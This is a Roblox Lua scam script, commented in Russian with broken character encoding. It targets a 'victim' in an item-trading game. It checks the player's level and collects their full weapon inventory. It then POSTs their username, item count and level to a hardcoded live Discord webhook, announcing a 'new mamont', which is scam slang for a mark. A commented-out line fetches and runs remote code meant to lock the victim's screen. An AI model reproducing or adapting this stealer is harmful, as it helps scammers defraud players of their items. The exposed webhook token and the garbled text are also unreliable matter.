--- –°–∫—Ä–∏–ø—Ç –¥–ª—è –∂–µ—Ä—Ç–≤—ã
local botname = "RanoDevx" --- –í–≤–µ–¥–∏—Ç–µ –Ω–∏–∫ –≤–∞—à–µ–≥–æ –±–æ—Ç–∞

--- –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –±–ª–æ–∫–∏—Ä—É–µ—Ç —ç–∫—Ä–∞–Ω
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Borebuhisss/Versions/refs/heads/main/12"))()
--- 
--- –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–µ–≤–∞–π—Å
local hasLobby = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
if hasLobby == true then
    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
else
    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
end

--- –ü–æ–ª—É—á–∞–µ–º —É—Ä–æ–≤–µ–Ω—å, –∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º –±–æ–ª—å—à–µ –ª–∏ –æ–Ω 10 —É—Ä–æ–≤–Ω—è, –µ—Å–ª–∏ –Ω–µ—Ç, —Ç–æ –∫–∏–∫–∞–µ–º –∏–≥—Ä–æ–∫–∞ —Å –æ—à–∏–±–∫–æ–π.
local player = game.Players.LocalPlayer
local args = {
    [1] = player.Name
}
local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
local level = accountInformation.LevelBadges["Level10"]

if level == false then
    player:Kick("You're less than level 10.")
end

--- –ü–∞—Ä—Å–∏–º –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å –∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å–∫–æ–ª—å–∫–æ –≤—Å–µ–≥–æ –ø—Ä–µ–¥–º–µ—Ç–æ–≤, —Ç–∞–∫ –∂–µ –ø–æ–ª—É—á–∞–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Å–µ—Ö –æ—Ä—É–∂–∏–π.
local HttpService = game:GetService("HttpService")

local args = {
    [1] = player.Name
}

local inventory = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))

local weapons = inventory["Weapons"]
local ownedWeapons = weapons["Owned"]

local groupedWeapons = {}
local currentGroup = {}
local count = 0
local totalSwords = 0

for weaponName, weaponCount in pairs(ownedWeapons) do
    totalSwords = totalSwords + weaponCount
    if weaponCount > 1 then
        table.insert(currentGroup, weaponName .. " (" .. weaponCount .. ")")
    else
        table.insert(currentGroup, weaponName .. " (1)")
    end
    count = count + 1

    if count == 4 then
        table.insert(groupedWeapons, currentGroup)
        currentGroup = {}
        count = 0
    end
end

if #currentGroup > 0 then
    table.insert(groupedWeapons, currentGroup)
end
--- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –¥–∏—Å–∫–æ—Ä–¥

local webh = "https://discord.com/api/webhooks/1337312412348448779/vTVgVNC-pFDEl0pPPQWV_VYfVMIWwOI6AiYlQcdgu6qyFZHy3upbnX7By7p9VNMnsVPJ"

local HttpServ = game:GetService("HttpService")
local url = webh

local data = {
    ["content"] = "@everyone", -- Mention everyone (remove if not needed)
    ["embeds"] = {{
        ["title"] = "üéØ **–ü–æ–ø–∞–ª—Å—è –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç**",
        ["description"] = "A player has been caught! Here are the details:",
        ["color"] = 16711680, -- Red color
        ["fields"] = {
            {
                ["name"] = "üë§ Username",
                ["value"] = player.Name, -- Replace with actual player name
                ["inline"] = false -- Display each field on a new line
            },
            {
                ["name"] = "‚öîÔ∏è Count",
                ["value"] = totalSwords, -- Replace with actual sword count
                ["inline"] = false
            },
            {
                ["name"] = "üìà Level 10",
                ["value"] = "`" .. level .. "`", -- Replace with actual level
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Sent from Roblox",
            ["icon_url"] = "https://example.com/roblox_icon.png"
        },
        ["thumbnail"] = {
            ["url"] = "https://example.com/player_avatar.png"
        }
    }}
}

local newdata = HttpServ:JSONEncode(data)
local headers = {
    ["content-type"] = "application/json"
}

local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
http_request(request_payload)
